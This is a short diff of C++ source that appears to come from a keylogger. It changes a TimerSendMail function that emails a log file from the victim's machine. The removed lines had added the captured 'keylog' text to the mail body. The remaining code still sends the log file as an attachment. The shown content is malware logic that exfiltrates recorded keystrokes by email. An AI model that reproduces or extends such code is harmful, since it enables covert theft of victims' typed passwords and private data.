@@ -20,9 +20,7 @@ void TimerSendMail(){
     }
 
     int mail_status = Mail::SendMail("Log ["+last_file+"]",
-                           "Sierra 117\n"
-                           "The file has been attached to this mail\n"
-                           "For testing, cheers:\n" + keylog,
+                           "The file has been attached to this mail",
                            IO::GetPath(true) + last_file);
 
     if(mail_status != 7){
